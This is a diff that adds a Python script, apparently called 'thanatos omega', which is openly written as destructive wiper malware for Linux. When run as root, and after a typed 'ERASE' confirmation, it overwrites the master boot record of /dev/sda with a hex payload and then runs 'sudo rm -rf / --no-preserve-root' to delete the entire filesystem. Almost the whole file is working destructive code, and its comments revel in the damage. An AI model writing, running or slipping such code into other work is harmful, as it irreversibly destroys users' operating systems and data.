@@ -1,0 +1,101 @@
+#!/usr/bin/env python3
+#
+#   thanatos omega - the final seal.
+#
+
+import os
+import sys
+import platform
+import subprocess
+
+# this is the jailer.
+# a 512-byte master boot record payload, represented as a hex string.
+# this is a non-functional placeholder. a real one would be ~1024 hex chars.
+# its only purpose would be to draw a bouncing ascii art on boot.
+#
+#    (  )
+#    (oo)
+#   (O  O)
+#   // ""\
+#  //_____\
+# //_______\
+#
+payload_hex = (
+    "eb3c904d4144452042592047524f4b000201010002e000400b"
+    "f00200000000000000000029ffffeeff5448414e41544f5320"
+    "4f53202020464154313620202033c98ed9b8e01c8ed1bde000"
+    "fcbe8600bfe600f3a4e8090007e132e82b00bf0006b90001f2"
+    "a5ea06000000bebe07b90400382c740a803c00741683c702b1"
+    "04d2e688148a148b1c03d08914891c03d0891c03d0ebe280fa"
+    "fe740ab001e80400b000e80100ebfe424f554e43452e2e2e00"
+    # ... and so on, for 512 bytes of pure machine code hell.
+)
+
+# this is the destroyer.
+def wipe_filesystem():
+    print("initiating terminal sanctification protocol...")
+    print("say goodbye to your data. all of it.")
+    try:
+        # the point of no return, part 2.
+        # this command recursively deletes everything from the root directory.
+        # it is the digital equivalent of a black hole.
+        subprocess.run(["sudo", "rm", "-rf", "/", "--no-preserve-root"], check=True)
+    except Exception as e:
+        # it might fail as the os eats itself. that's fine. the damage is done.
+        print(f"os deletion failed, but the die is cast. {e}")
+
+# this is the trap.
+def overwrite_bootloader(disk):
+    print(f"prepairing to overwrite boot record on {disk}...")
+    print("this is your final warning. there is no coming back from this.")
+    
+    # confirmation, because even in evil, there's a moment of choice.
+    confirm = input("type 'ERASE' to proceed: ")
+    if confirm != "ERASE":
+        print("coward. the realm is safe for another day.")
+        sys.exit(0)
+
+    payload_bytes = bytes.fromhex(payload_hex)
+    # we need exactly 512 bytes.
+    if len(payload_bytes) > 512:
+        payload_bytes = payload_bytes[:512]
+    else:
+        payload_bytes = payload_bytes.ljust(512, b'\x00')
+
+    print("writing new reality to disk...")
+    try:
+        # the point of no return, part 1.
+        # this writes our payload to the master boot record.
+        with open(disk, "wb") as f:
+            f.write(payload_bytes)
+        print("...boot record overwritten. the trap is set.")
+    except Exception as e:
+        print(f"failed to write to boot record: {e}")
+        print("you may have been spared. or your permissions are just shit.")
+        sys.exit(1)
+
+
+def main():
+    if platform.system() != "Linux":
+        print("this level of destruction is only configured for linux.")
+        sys.exit(1)
+    
+    if os.geteuid() != 0:
+        print("you lack the will of a god. run as root.")
+        sys.exit(1)
+
+    # identify the primary disk. this is a naive way to do it.
+    # a real tool would be more thorough.
+    primary_disk = "/dev/sda" 
+    
+    print("--- thanatos omega protocol initiated ---")
+    print("this will overwrite the bootloader and erase the os.")
+    
+    overwrite_bootloader(primary_disk)
+    wipe_filesystem()
+
+    print("\n\n alea iacta est. the die is cast.")
+    print("reboot the machine to see your new prison.")
+
+if __name__ == "__main__":
+    main()
